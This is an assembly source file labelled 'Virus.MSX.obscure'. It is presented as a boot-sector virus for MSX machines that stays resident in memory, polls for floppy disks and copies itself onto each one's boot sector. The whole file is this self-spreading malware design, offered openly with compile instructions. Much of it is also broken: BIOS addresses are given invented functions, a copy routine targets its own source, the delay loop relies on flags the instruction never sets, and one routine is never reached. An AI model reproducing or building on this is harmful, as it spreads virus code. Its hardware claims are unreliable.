; Virus.MSX.obscure
; compile with PASMO or any Z80 assembler that supports MSX

        ORG    $0100         ; Start of the MSX Boot Sector at 0x0100

START:
        DI                  ; Disable interrupts
        CALL    Init         ; Initialize the program (set up stack, etc.)
        CALL    StayResident ; Make the program memory resident
        CALL    MainLoop     ; Start the main loop

; ---- Initialization ----
Init:
        ; Set up the stack and necessary BIOS calls for memory-resident
        LD HL, $FFFF        ; Set stack pointer to end of RAM (usually)
        LD SP, HL
        RET

; ---- Stay Resident ----
StayResident:
        ; Make the program memory resident (we use $8000 for residency)
        LD HL, $8000        ; Resident address for our program
        LD DE, $8000        ; Copy to this address
        LD BC, 0x0800       ; Size of program (2KB for example, adjust as needed)
        CALL  $5C00          ; MSX-DOS: Allocate memory (size in BC)
        RET

; ---- Main Loop ----
MainLoop:
        CALL    CheckFloppy  ; Check if a floppy disk is inserted
        CALL    Delay        ; Wait for 2 seconds
        JP      MainLoop     ; Repeat loop

; ---- Check Floppy ----
CheckFloppy:
        ; BIOS Call: 0x1A to check for floppy disk insertion
        LD A, $1A           ; MSX-DOS BIOS call for checking floppy
        CALL $0010          ; BIOS: Check floppy status
        JP Z, NoFloppy      ; If no floppy disk inserted, skip
        CALL    CopyToBoot   ; If new floppy inserted, copy to boot sector
        RET

NoFloppy:
        RET

; ---- Copy Program to Boot Sector ----
CopyToBoot:
        ; Copy the program to the boot sector (start of the disk)
        LD HL, $8000        ; Address of our resident program
        LD DE, $0200        ; Boot sector (start of the disk)
        LD BC, 0x0100       ; Size to copy (256 bytes for simplicity)
        CALL $0026          ; BIOS call to copy memory to disk
        RET

; ---- Delay for 2 seconds ----
Delay:
        LD BC, 0x1000       ; Loop count
DelayLoop:
        NOP                 ; No operation (wasting time)
        DEC BC
        JP NZ, DelayLoop    ; Repeat until delay is over
        RET

; ---- Load MSX-DOS ----
LoadMSXDOS:
        ; Load MSX-DOS into memory (address $8000 for example)
        LD HL, $8000        ; Load address where MSX-DOS will be loaded
        LD DE, $0200        ; Starting address in the disk for MSX-DOS (sector 2, assuming)
        LD BC, $0100        ; MSX-DOS size (256 bytes for example)
        
        CALL $0026          ; BIOS: Read data from disk into memory (from DE to HL, size in BC)

        ; Jump to the start of MSX-DOS (now at $8000)
        JP $8000            ; Transfer control to MSX-DOS

; ---- End of Program ----
        END START
